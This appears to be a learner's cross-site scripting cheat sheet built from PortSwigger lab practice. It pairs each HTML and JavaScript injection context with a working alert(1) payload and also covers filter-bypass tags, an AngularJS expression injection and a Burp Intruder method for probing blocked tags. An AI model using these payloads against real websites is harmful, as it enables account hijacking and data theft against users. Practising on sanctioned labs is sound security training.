# XSS Cheat Sheet

## The method (ask this every time)

1. Type a random word like `zzzzzz123` into the input
2. Right-click near where it shows up, click Inspect
3. Find your word in the code, look at what's immediately around it, that's
   the "house" it's sitting in
4. Match the house to the trick below

## Houses and tricks

### House: plain in the page, nothing special around it

Your word just shows up as normal text on the page.

```html
<p>You searched for: zzzzzz123</p>
```

Trick: just inject a script tag directly, nothing to escape first

```
<script>alert(1)</script>
```

### House: inside a quoted HTML attribute

Your word is sitting inside `"..."` as part of some tag's attribute.

```html
<img src="zzzzzz123">
```

Trick: close the quote and the tag, then start a fresh element

```
"><svg onload=alert(1)>
```

### House: inside a quoted attribute, but angle brackets are blocked

Same as above, but `<` and `>` get encoded if you try to use them.

```html
<input value="zzzzzz123">
```

Trick: stay inside the attribute, close it with a quote, then open a brand new
attribute with its own event handler, no angle brackets needed

```
"onmouseover="alert(1)
```

### House: inside a box element like select or option

Your word is one of the options in a dropdown.

```html
<select><option>zzzzzz123</option></select>
```

Trick: close the whole box first, then start a new, independent element after it

```
"></select><img src=1 onerror=alert(1)>
```

### House: inside a JavaScript string

Your word is sitting inside quotes, but inside a `<script>` block, not plain HTML.

```html
<script>var searchTerm = 'zzzzzz123';</script>
```

Trick: close the JavaScript string with a quote, run your own statement, then
patch the rest of the line so it doesn't break

```
'-alert(1)-'
```

### House: an href link (anchor tag)

Your word becomes part of a link's destination.

```html
<a href="zzzzzz123">click here</a>
```

Trick: replace the whole value with a javascript: URL, no need to break out of
anything, it runs when the link is clicked

```
javascript:alert(1)
```

### House: a page using double curly braces anywhere, {{ }}

This usually means a framework like AngularJS is reading that text as code, not
plain text, even with no HTML tags involved.

```html
<div ng-app>zzzzzz123</div>
```

Trick: speak the framework's own expression syntax instead of HTML

```
{{$on.constructor('alert(1)')()}}
```

## Notes

- Always do step 1 (random word) and step 2 (inspect it) first. Never guess a
  payload before seeing the actual house
- Houses above are only the ones tested so far, in these PortSwigger labs. New
  houses get added here as they come up
- Tested by me: all houses above, each one in its matching lab

## Finding what a filter blocks (Burp Intruder method)

1. Confirm an obvious payload gets blocked (usually a 400 response)
2. Send the request to Intruder, replace input with `<>`, mark a payload
   position between the brackets
3. Paste PortSwigger's tag list (from their own XSS cheat sheet) as payloads,
   run the attack, look for 200s among the 400s
4. Repeat with the event list once a working tag is found

### House: a filter blocks common tags (img, svg alone, body)

Trick: try an unrecognized, made-up tag name, the browser still renders it
as an element with working attributes, even though it means nothing to HTML
itself. Needs a focus trigger since there's no load/error event to use.

```
<xss id=x onfocus=alert(1) tabindex=1>#x
```

The #x at the end matches id=x, which auto-focuses the element on page load.

### House: a filter blocks common tags but SVG animation tags survive

```
<svg><animatetransform onbegin=alert(1)>
```

animatetransform (and others like animate, set) only work inside an <svg>
wrapper, and carry their own events (onbegin, onend, onrepeat) tied to the
animation's lifecycle, fires automatically when the animation starts.

### House: reflected inside a link tag's href, single quotes

```
'accesskey='x'onclick='alert(1)
```

accesskey assigns a keyboard shortcut to any element. onclick fires when
that shortcut is pressed, not just from a real mouse click.

## Deciding: direct URL, or exploit server?

- Fires immediately when the page with the input loads, no second step
  needed → visit the crafted URL directly
- Needs something to happen after the page has already loaded (a hash
  changing, a resize, a stored comment viewed by someone else) → needs the
  exploit server, to build a page that causes that second step
- Edge case: a lab's simulated victim performing an action (like a key
  press) counts as handled automatically, direct URL can still work even
  though a "second step" is technically involved
